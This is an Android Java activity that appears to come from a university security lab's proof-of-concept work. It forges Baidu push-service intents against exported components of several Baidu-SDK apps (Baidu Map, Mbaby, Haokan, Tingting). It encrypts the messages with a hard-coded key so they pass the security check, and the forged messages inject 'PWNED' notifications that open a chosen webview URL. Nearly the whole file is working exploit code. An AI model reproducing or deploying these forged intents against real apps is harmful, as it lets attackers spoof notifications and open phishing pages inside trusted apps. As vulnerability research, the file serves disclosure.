package com.lab310.fdu.template;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.lab310.fdu.template.util.BDUtil;

import java.util.Random;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button_mpush = (Button)findViewById(R.id.button_mpush);
        Button button_mbaby = (Button)findViewById(R.id.button_mbaby);
        Button button_tingting = (Button)findViewById(R.id.button_tingting);
        button_mpush.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View view) {
//                sendBaiduHaokan(bodyBaiduHaokan(), "com.baidu.haokan", "7897439", "com.baidu.haokan.external.push.HaokanPushMessageReceiver");
                sendBaiduPush(bodyBaiduMap(), "com.baidu.BaiduMap", "289338", "com.baidu.android.pushservice.PushMessageReceiver");
            }
        });
        button_mbaby.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String request_id = random.nextInt(10000)+ ""+random.nextInt(1000000000);
                sendBaiduMbaby(request_id, bodyBaiduMbaby(request_id), "com.baidu.mbaby", "9249661", "com.baidu.box.receiver.BaiDuYunMessageReceiver");
            }
        });
        button_tingting.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String request_id = random.nextInt(10000)+ ""+random.nextInt(1000000000);
                sendBaiduTingting(bodyBaiduTingting(), "com.audio.tingting", "5317547", "com.audio.tingting.receiver.MyPushMessageReceiver");
            }
        });
    }


    static Random random = new Random();


    private String bodySearchBox() {
        return "{\"error_code\":\"100\",\"error_msg\":\"success\",\"data\":{\"type\":2,\"pos\":1,\"time\":1526598777,\"body\":{\"msg_id\":"+ random.nextInt(10000000)+",\"group_id\":8,\"msg_type\":0,\"data\":{\"title\":\"PWNED\",\"description\":\"PWNED BY WHITZARD\",\"expire\":\"432000000\",\"url\":\"http:\\/\\/www.fudan.edu.cn\",\"icon\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\",\"level\":\"1\",\"cate_id\":8,\"banner_tpl_id\":\"1\",\"banner_img\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/smalllogo.png\",\"o2o\":1,\"opentype\":2,\"pdt\":\"n2835981\",\"fg\":4835840},\"classid\":3}},\"is_notice\":1}";
    }
    private String bodyBaiduMap() {
        return "{\"aps\":{\"alert\":\"PWNED\",\"sound\":\"default\",\"badge\":1},\"ext\":{\"t\":\"webview\",\"l\":\"http://www.fudan.edu.cn\",\"exp\":-1,\"mi\":\"broadcast1688_20180504\",\"mid\":\"7adb1961a04d86ae89cefa23b57c29c5\",\"d\":{\"s\":\"PWNED BY WHITZARD\"},\"category\":\"promsg\"}}";
    }

    private String bodyBaiduMbaby(String request_id) {
//        return "{\"title\":\"title\",\"description\":\"description\",\"notification_basic_style\":{\"type\":2,\"pos\":1,\"time\":1526598777,\"body\":{\"msg_id\":"+ random.nextInt(10000000)+",\"group_id\":8,\"msg_type\":0,\"data\":{\"title\":\"PWNED\",\"description\":\"PWNED BY WHITZARD\",\"expire\":\"432000000\",\"url\":\"http:\\/\\/www.fudan.edu.cn\",\"icon\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\",\"level\":\"1\",\"cate_id\":8,\"banner_tpl_id\":\"1\",\"banner_img\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/smalllogo.png\",\"o2o\":1,\"opentype\":2,\"pdt\":\"n2835981\",\"fg\":4835840},\"classid\":3}},\"is_notice\":1}";
        return "{\"type\" : 1, \"msg_id\" : " + request_id + ", \"title\":\"CSS\", \"content\":\"ZGY\", \"data\":{\"unread\": 0, \"msgNo\": 8, \"url\" : \"http:\\/\\/www.fudan.edu.cn\\/2016\", \"img\": \"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\"}}";
    }
    private String bodyBaiduHaokan() {
//        return "{\"title\":\"title\",\"description\":\"description\",\"notification_basic_style\":{\"type\":2,\"pos\":1,\"time\":1526598777,\"body\":{\"msg_id\":"+ random.nextInt(10000000)+",\"group_id\":8,\"msg_type\":0,\"data\":{\"title\":\"PWNED\",\"description\":\"PWNED BY WHITZARD\",\"expire\":\"432000000\",\"url\":\"http:\\/\\/www.fudan.edu.cn\",\"icon\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\",\"level\":\"1\",\"cate_id\":8,\"banner_tpl_id\":\"1\",\"banner_img\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/smalllogo.png\",\"o2o\":1,\"opentype\":2,\"pdt\":\"n2835981\",\"fg\":4835840},\"classid\":3}},\"is_notice\":1}";
        return "{\"title\":\"title\",\"description\":\"description\",\"notification_basic_style\":7, \"open_type\":2, \"net_support\":1, \"pkg_content\":\"pkg_content\", \"pkg_name\": \"pkg_name\", \"hw_intenturi\":\"intenturi\", \"pkg_version\"\"0.1\", \"custom_content\":{\"arrived_from\":\"push\", \"push_title\": \"push_title\", \"img\": \"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\"}}";
    }
    private String bodyBaiduTingting() {
        return "{\"aps\":{\"alert\":\"PWNED\",\"sound\":\"default\",\"badge\":1},\"ext\":{\"t\":\"webview\",\"l\":\"http://www.fudan.edu.cn\",\"exp\":-1,\"mi\":\"broadcast1688_20180504\",\"mid\":\"7adb1961a04d86ae89cefa23b57c29c5\",\"d\":{\"s\":\"PWNED BY WHITZARD\"},\"category\":\"promsg\"}}";
    }
    private String bodyBaiduPassport(){
        return "";
    }

    private void sendBaiduPush(String body, String packageName, String app_id, String receiver){
        String msg_id = random.nextInt(10000)+ ""+random.nextInt(1000000000);
        String encString = BDUtil.a(BDUtil.merge(BDUtil.merge(app_id.getBytes(), msg_id.getBytes()), body.getBytes() ), false);
        byte[] bytes = new byte[0];
        try {
            bytes = BDUtil.b(encString.getBytes(), BDUtil.key0);
        } catch (Exception e) {
            e.printStackTrace();
        }
        //System.out.println(BDUtil.bytesToHex(bytes) );

        Intent intent = new Intent();
         String commandService = "com.baidu.android.pushservice.CommandService";
        ComponentName componentName = new ComponentName(packageName, commandService);
        intent.setComponent(componentName);

         intent.setAction("com.baidu.android.pushservice.action.MESSAGE");
         intent.putExtra("message_id" ,msg_id);
         intent.putExtra("baidu_message_type" , 0);
         intent.putExtra("baidu_message_secur_info" , bytes);
         intent.putExtra("message_string", body);

         intent.putExtra("app_id" ,app_id);
         intent.putExtra("baidu_message_body" ,body.getBytes() );

//        sendBroadcast(intent);
         startService(intent);
        Log.d("SendBaiduPush", "sendBaiduPush: successfully "+ receiver);
    }

    private void sendBaiduHaokan(String body, String packageName, String app_id, String receiver){
        String msg_id = random.nextInt(10000)+ ""+random.nextInt(1000000000) + "" + random.nextInt(1000000);
        String encString = BDUtil.a(BDUtil.merge(BDUtil.merge(app_id.getBytes(), msg_id.getBytes()), body.getBytes() ), false);
        byte[] bytes = new byte[0];
        try {
            bytes = BDUtil.b(encString.getBytes(), BDUtil.key0);
        } catch (Exception e) {
            e.printStackTrace();
        }
        //System.out.println(BDUtil.bytesToHex(bytes) );

        Intent intent = new Intent();
        ComponentName componentName = new ComponentName(packageName, receiver);
        intent.setComponent(componentName);

//        intent.setAction("com.baidu.android.pushservice.action.MESSAGE");
//        intent.putExtra("message_id" ,msg_id);
//        intent.putExtra("baidu_message_type" , 0);
//        intent.putExtra("baidu_message_secur_info" , bytes);
//        intent.putExtra("message_string", body);


        //test
        intent.setAction("com.baidu.android.pushservice.action.RECEIVE");
        String string_content = "{\"arrived_from\":\"push\", \"push_title\":\"push_title\", \"pushurl\":\"http:\\/\\/www.fudan.edu.cn\", \"img\": \"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\"}";
        intent.putExtra("method","com.baidu.android.pushservice.action.notification.ARRIVED");
        intent.putExtra("notification_title", "CSS");
        intent.putExtra("msgid",msg_id);
        intent.putExtra("com.baidu.pushservice.app_id", app_id);
        intent.putExtra("extra_extra_custom_content", string_content);
        intent.putExtra("notification_content", "你喜欢就好>>");
        intent.putExtra("baidu_message_secur_info" , bytes);
        intent.putExtra("command_type", "reflect_receiver");

//        intent.putExtra("app_id" ,app_id);
        intent.putExtra("baidu_message_body" ,body.getBytes() );
        sendBroadcast(intent);
        Log.d("SendBaiduPush", "sendBaiduPush: successfully "+ receiver);
    }

    private void sendBaiduMbaby(String request_id, String body, String packageName, String app_id, String receiver){
        String msg_id = random.nextInt(10000)+ ""+random.nextInt(1000000000) + "" + random.nextInt(1000000);
        String encString = BDUtil.a(BDUtil.merge(BDUtil.merge(app_id.getBytes(), msg_id.getBytes()), body.getBytes() ), false);
        byte[] bytes = new byte[0];
        try {
            bytes = BDUtil.b(encString.getBytes(), BDUtil.key0);
        } catch (Exception e) {
            e.printStackTrace();
        }
        //System.out.println(BDUtil.bytesToHex(bytes) );

        Intent intent = new Intent();
        // com.baidu.android.pushservice.CommandService
        String commandService = "com.baidu.android.pushservice.CommandService";

        ComponentName componentName = new ComponentName(packageName, commandService);
        intent.setComponent(componentName);



        //test
        intent.setAction("com.baidu.android.pushservice.action.MESSAGE");
        String string_content = "{\"arrived_from\":\"push\", \"push_title\":\"push_title\", \"pushurl\":\"http:\\/\\/www.fudan.edu.cn\", \"img\": \"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\"}";

        intent.putExtra("bd.cross.request.COMMAND_TYPE", "bd.cross.command.MESSAGE_DELIVER");
        intent.putExtra("bd.cross.request.ID", request_id);
        intent.putExtra("message_id", msg_id);
        intent.putExtra("app_id", app_id);
        intent.putExtra("bd.cross.request.NEED_CALLBACK", true);
        intent.putExtra("msg_id", msg_id);
        intent.putExtra("bd.cross.request.SENDING", true);
        intent.putExtra("bd.cross.request.SOURCE_PACKAGE", "com.baidu.mbaby");
        intent.putExtra("baidu_message_body", body.getBytes());
        intent.putExtra("baidu_message_type", 0);
        intent.putExtra("message", body);
        intent.putExtra("message_string", body);
        intent.putExtra("baidu_message_secur_info" , bytes);
        intent.putExtra("bd.cross.request.SOURCE_SERVICE", "com.baidu.android.pushservice.PushService");


//        intent.putExtra("app_id" ,app_id);
//        sendBroadcast(intent);
        startService(intent);
        Log.d("SendBaiduPush", "sendBaiduPush: successfully "+ receiver);
    }


    private void sendBaiduTingting(String body, String packageName, String app_id, String receiver){
        String msg_id = random.nextInt(10000)+ ""+random.nextInt(1000000000);
        String encString = BDUtil.a(BDUtil.merge(BDUtil.merge(app_id.getBytes(), msg_id.getBytes()), body.getBytes() ), false);
        byte[] bytes = new byte[0];
        try {
            bytes = BDUtil.b(encString.getBytes(), BDUtil.key0);
        } catch (Exception e) {
            e.printStackTrace();
        }
        //System.out.println(BDUtil.bytesToHex(bytes) );

        Intent intent = new Intent();
//        String commandService = "com.baidu.android.pushservice.CommandService";
        ComponentName componentName = new ComponentName(packageName, receiver);
        intent.setComponent(componentName);

        intent.setAction("com.baidu.android.pushservice.action.MESSAGE");
        intent.putExtra("method", "com.baidu.android.pushservice.action.notification.ARRIVED");
        intent.putExtra("message_id" ,msg_id);
        intent.putExtra("baidu_message_type" , 0);
        intent.putExtra("baidu_message_secur_info" , bytes);
        intent.putExtra("message_string", body);

        intent.putExtra("app_id" ,app_id);
        intent.putExtra("baidu_message_body" ,body.getBytes() );

        sendBroadcast(intent);
//        startService(intent);
        Log.d("SendBaiduPush", "sendBaiduPush: successfully "+ receiver);
    }
}

